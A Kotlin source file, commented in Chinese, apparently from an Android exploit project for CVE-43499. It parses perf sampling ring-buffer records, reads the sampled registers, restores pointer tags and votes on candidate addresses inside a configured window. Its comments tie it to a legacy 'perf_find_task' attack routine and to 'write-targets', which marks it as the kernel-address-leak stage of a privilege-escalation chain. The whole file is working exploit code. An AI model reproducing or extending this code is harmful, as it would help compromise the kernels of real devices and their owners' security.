package com.ghostlock.app.backend.cve43499.perf

/**
 * perf record 布局与 sample 格式的契约（内核 perf ABI 常量；Kotlin 侧解析用）。
 *
 * @note 这些值是**内核 perf ABI**（不是目标/容量参数）：record header 与
 *   `PERF_SAMPLE_*` 位由内核 ABI 固定。payload 的期望长度**不写死**：由
 *   `sample_type` 是否含 IP/REGS_INTR 与 `register_count` 推导（见
 *   [Cve43499PerfSampleParser]）。
 * @note 阶段：R3e-2；对应 `core/perf.c` 只做整块拷贝、不解析。
 */
internal object Cve43499PerfSampleFormat {
    /** `PERF_RECORD_SAMPLE` 的 record type。 */
    const val RECORD_SAMPLE: Long = 9L

    /** record header 长度（type u32 + misc u16 + size u16）。 */
    const val HEADER_BYTES: Long = 8L

    /** `PERF_SAMPLE_IP` 的 IP 字段长度。 */
    const val IP_BYTES: Long = 8L

    /** `PERF_SAMPLE_REGS_INTR` 的 ABI 字长度。 */
    const val ABI_BYTES: Long = 8L

    /** `PERF_SAMPLE_REGS_ABI_NONE`：无寄存器载荷。 */
    const val ABI_NONE: Long = 0L

    /** `PERF_SAMPLE_REGS_ABI_64`：64 位寄存器组。 */
    const val ABI_64: Long = 1L

    /**
     * `PERF_SAMPLE_REGS_ABI_32` 字段值（=2）。
     *
     * @note G1 真机证据（A301SO）：该内核把 64 位进程的寄存器 record 标为 ABI=2，
     *   但 record 仍是 **280B/32×8B regs**；legacy `perf_find_task` 也按
     *   `abi==1||abi==2` 读 8B regs。因此解析器接受 ABI=1/2 且按 280B 解析；
     *   272/279/281 等尺寸仍 `perf-record-invalid`。
     */
    const val ABI_32: Long = 2L

    /** `PERF_SAMPLE_IP` 位。 */
    const val SAMPLE_IP_BIT: Long = 1L shl 0

    /**
     * `PERF_SAMPLE_REGS_INTR` 位（内核 ABI：`1U << 18` = 262144）。
     *
     * @note **禁止写成 `1L shl 14`**：该位是 `PERF_SAMPLE_WEIGHT`（1<<14），
     *   写成 WEIGHT 时内核不会投递寄存器载荷（2026-10-08 探针事故根因；
     *   legacy 使用内核宏 `PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR`）。
     */
    const val SAMPLE_REGS_INTR_BIT: Long = 1L shl 18

    /** 已知错误位（`PERF_SAMPLE_WEIGHT=1<<14`）：仅用于回归测试断言其被拒绝。 */
    const val SAMPLE_WEIGHT_BIT: Long = 1L shl 14

}

/**
 * 一次 pass 的解析配置（全部来自 debug 配置 / execution 参数）。
 *
 * @property identityStart/identityEnd 候选地址的严格开区间窗（同 placement identity）。
 * @property tagNibble/tagShift canonical tag 还原参数（A301SO=0xf/56；0/0 不还原）。
 * @property registerCount 寄存器数（A301SO=32）。
 * @property spRegisterIndex `sp` 在寄存器数组中的下标（perf ARM64 ABI=31）。
 * @property candidateCapacity 候选容量（A301SO=256）。
 * @property sampleType 请求的 `PERF_SAMPLE_*` 位；本设计必须恰为 IP|REGS_INTR。
 * @property taskAlignment 可选的地址对齐要求（0=不启用；G1 后按证据收紧）。
 * @note 阶段：R3e-2；非法配置由 target source 具名 fail-closed。
 */
internal data class Cve43499PerfParseConfig(
    val identityStart: Long,
    val identityEnd: Long,
    val tagNibble: Long,
    val tagShift: Long,
    val registerCount: Int,
    val spRegisterIndex: Int,
    val candidateCapacity: Int,
    val sampleType: Long,
    val taskAlignment: Long,
)

/**
 * 单个 pass 的解析结局：地址 + 投票事实，或解析层具名失败。
 *
 * @property address 票数最高的候选（2-of-3 的单个 pass 输入）。
 * @property votes 该地址在本 pass 候选集中的频次。
 * @property candidates 本 pass 收集到的候选总数（≤candidateCapacity）。
 * @property spVotes `address` 在 sp 寄存器位置出现的次数（SP 证据，默认仅记录）。
 * @property alignmentOk `address` 是否满足 `taskAlignment`（0=不启用则恒 true）。
 * @property spEvidenceOk `spVotes>=1`（默认仅记录，`require_sp_evidence` 时强制）。
 * @note 阶段：R3e-2；阈值/2-of-3 聚合在 target source（设计 §B3 方案 B）。
 */
internal sealed interface Cve43499PerfPass {
    /** 解析成功：给出本 pass 的投票地址。 */
    data class Address(
        val address: Long,
        val votes: Long,
        val candidates: Long,
        val spVotes: Long,
        val alignmentOk: Boolean,
        val spEvidenceOk: Boolean,
    ) : Cve43499PerfPass

    /** 解析失败（具名；`perf-*` 前缀，Flow 会拼上 `write-targets-missing:`）。 */
    data class Missing(val reason: String) : Cve43499PerfPass
}

/**
 * perf 采样环的 Kotlin 解析器（纯函数；无 Android/JNI/时间/环境）。
 *
 * 语义镜像 legacy `perf_find_task`（`legacy/attack/ops.cpp:468-509`）：record 头
 * 窄 size、跳过 IP、按 ABI 读 32 个寄存器、tag 还原、identity 窗过滤、频次投票
 * 平票取先出现。差异（均显式、可测）：
 * - 记录长度**由 sample_type/register_count 推导**（本配置 280B；ABI=0 合法 24B），
 *   272/279/281 等一律 `perf-record-invalid`；
 * - `data_head/data_tail` 是单调绝对位置，`unconsumed>data_size` 才报 overflow；
 * - 4KB 环边界处的跨环 record 用取模组装（不假设记录不跨环）。
 *
 * @note 阶段：R3e-2；本类不选择最终地址（由 target source 做 2-of-3 + 门槛）。
 */
internal object Cve43499PerfSampleParser {
    /**
     * 解析一次 `collectPerfSamples` 的 raw 环副本。
     *
     * @param ring Native 整块拷贝的环数据区（长度必须 >= dataSize）。
     * @param dataSize 环数据区字节数（来自回执）。
     * @param dataHead 单调绝对 data_head。
     * @param dataTailBefore 本次 collect 前的单调绝对 data_tail。
     * @param config 解析配置。
     * @return [Cve43499PerfPass.Address] 或具名 [Cve43499PerfPass.Missing]。
     */
    fun parse(
        ring: ByteArray,
        dataSize: Long,
        dataHead: Long,
        dataTailBefore: Long,
        config: Cve43499PerfParseConfig,
    ): Cve43499PerfPass {
        if (dataSize <= 0L || dataSize > ring.size.toLong()) {
            return missing("perf-ring-geometry-mismatch")
        }
        if (dataHead < dataTailBefore) return missing("perf-record-invalid")
        val unconsumed = dataHead - dataTailBefore
        if (unconsumed > dataSize) return missing("perf-ring-overflow")
        if (unconsumed == 0L) return missing("perf-no-samples")

        val capacity = config.candidateCapacity
        if (capacity <= 0) return missing("perf-config-invalid")
        val candidates = LongArray(capacity)
        val spValues = LongArray(capacity)
        var candidateCount = 0
        var spCount = 0
        var samples = 0
        var noRegisterSamples = 0
        var position = dataTailBefore
        while (position < dataHead) {
            if (dataHead - position < Cve43499PerfSampleFormat.HEADER_BYTES) {
                return missing("perf-record-invalid")
            }
            val type = readU32(ring, dataSize, position)
            val size = readU16(ring, dataSize, position + 6L)
            if (size == 0L) break
            if (size < Cve43499PerfSampleFormat.HEADER_BYTES ||
                size > dataHead - position
            ) {
                return missing("perf-record-invalid")
            }
            if (type != Cve43499PerfSampleFormat.RECORD_SAMPLE) {
                position += size
                continue
            }
            val abiPosition = position + Cve43499PerfSampleFormat.HEADER_BYTES +
                Cve43499PerfSampleFormat.IP_BYTES
            if (abiPosition + Cve43499PerfSampleFormat.ABI_BYTES >
                position + size
            ) {
                return missing("perf-record-invalid")
            }
            val abi = readU64(ring, dataSize, abiPosition)
            when (abi) {
                Cve43499PerfSampleFormat.ABI_NONE -> {
                    val expected = Cve43499PerfSampleFormat.HEADER_BYTES +
                        Cve43499PerfSampleFormat.IP_BYTES +
                        Cve43499PerfSampleFormat.ABI_BYTES
                    if (size != expected) return missing("perf-record-invalid")
                    noRegisterSamples++
                }
                Cve43499PerfSampleFormat.ABI_64,
                Cve43499PerfSampleFormat.ABI_32 -> {
                    /* ABI=2 在本内核同样携带 280B/8B regs（G1 证据），与 1 同解析。 */
                    val expected = Cve43499PerfSampleFormat.HEADER_BYTES +
                        Cve43499PerfSampleFormat.IP_BYTES +
                        Cve43499PerfSampleFormat.ABI_BYTES +
                        config.registerCount.toLong() * 8L
                    if (size != expected) return missing("perf-record-invalid")
                    samples++
                    val registersAt = abiPosition + Cve43499PerfSampleFormat.ABI_BYTES
                    var spValue = 0L
                    for (index in 0 until config.registerCount) {
                        val raw = readU64(
                            ring,
                            dataSize,
                            registersAt + index.toLong() * 8L,
                        )
                        val restored = restore(raw, config)
                        if (restored > config.identityStart &&
                            restored < config.identityEnd &&
                            candidateCount < capacity
                        ) {
                            candidates[candidateCount++] = restored
                        }
                        if (index == config.spRegisterIndex) spValue = restored
                    }
                    if (spCount < capacity) spValues[spCount++] = spValue
                    if (candidateCount >= capacity) break
                }
                else -> return missing("perf-record-invalid")
            }
            position += size
        }
        if (samples == 0) {
            return missing(
                if (noRegisterSamples > 0) {
                    "perf-registers-not-delivered"
                } else {
                    "perf-no-samples"
                },
            )
        }
        if (candidateCount == 0) return missing("perf-no-candidates")
        val address = vote(candidates, candidateCount)
        var votes = 0L
        for (index in 0 until candidateCount) {
            if (candidates[index] == address) votes++
        }
        var spVotes = 0L
        for (index in 0 until spCount) {
            if (spValues[index] == address) spVotes++
        }
        val alignmentOk = if (config.taskAlignment > 0L) {
            address % config.taskAlignment == 0L
        } else {
            true
        }
        return Cve43499PerfPass.Address(
            address = address,
            votes = votes,
            candidates = candidateCount.toLong(),
            spVotes = spVotes,
            alignmentOk = alignmentOk,
            spEvidenceOk = spVotes > 0L,
        )
    }

    /**
     * canonical tag 还原：`v | (tag_nibble << tag_shift)`；0/0 表示不还原。
     *
     * @param sampled 采样寄存器原值。
     * @param config 解析配置（nibble/shift 由 debug 配置给出）。
     * @return 还原后的候选值。
     */
    private fun restore(sampled: Long, config: Cve43499PerfParseConfig): Long {
        if (config.tagNibble == 0L || config.tagShift <= 0L) return sampled
        return sampled or (config.tagNibble shl config.tagShift.toInt())
    }

    /**
     * legacy 投票：频次最大；平票取先出现（严格 `>` 比较）。
     *
     * @param values 候选数组。
     * @param count 有效元素个数。
     * @return 票数最高的候选；空集返回 0。
     */
    private fun vote(values: LongArray, count: Int): Long {
        var best = 0L
        var bestCount = 0L
        for (index in 0 until count) {
            val candidate = values[index]
            var seen = 0L
            for (other in 0 until count) {
                if (values[other] == candidate) seen++
            }
            if (seen > bestCount) {
                bestCount = seen
                best = candidate
            }
        }
        return best
    }

    private fun missing(reason: String): Cve43499PerfPass =
        Cve43499PerfPass.Missing(reason)

    /**
     * 从环缓冲读取一个 u16（按 `data_size` 取模组装跨环字节）。
     *
     * @param ring 环数据区副本。
     * @param dataSize 环数据区字节数。
     * @param position 绝对位置（单调）。
     * @return 小端 u16。
     */
    private fun readU16(ring: ByteArray, dataSize: Long, position: Long): Long {
        var value = 0L
        for (index in 0 until 2) {
            val byte = byteAt(ring, dataSize, position + index)
            value = value or (byte.toLong() shl (8 * index))
        }
        return value
    }

    /**
     * 从环缓冲读取一个 u32（按 `data_size` 取模组装跨环字节）。
     *
     * @param ring 环数据区副本。
     * @param dataSize 环数据区字节数。
     * @param position 绝对位置（单调）。
     * @return 小端 u32。
     */
    private fun readU32(ring: ByteArray, dataSize: Long, position: Long): Long {
        var value = 0L
        for (index in 0 until 4) {
            val byte = byteAt(ring, dataSize, position + index)
            value = value or (byte.toLong() shl (8 * index))
        }
        return value
    }

    /**
     * 从环缓冲读取一个 u64（按 `data_size` 取模组装跨环字节）。
     *
     * @param ring 环数据区副本。
     * @param dataSize 环数据区字节数。
     * @param position 绝对位置（单调）。
     * @return 小端 u64。
     */
    private fun readU64(ring: ByteArray, dataSize: Long, position: Long): Long {
        var value = 0L
        for (index in 0 until 8) {
            val byte = byteAt(ring, dataSize, position + index)
            value = value or (byte.toLong() shl (8 * index))
        }
        return value
    }

    /**
     * 按 `data_size` 取模读取一个字节（跨环 record 拼接）。
     *
     * @param ring 环数据区副本。
     * @param dataSize 环数据区字节数（>0 已校验）。
     * @param position 绝对位置。
     * @return 无符号字节值。
     */
    private fun byteAt(ring: ByteArray, dataSize: Long, position: Long): Int =
        ring[(position % dataSize).toInt()].toInt() and 0xFF
}
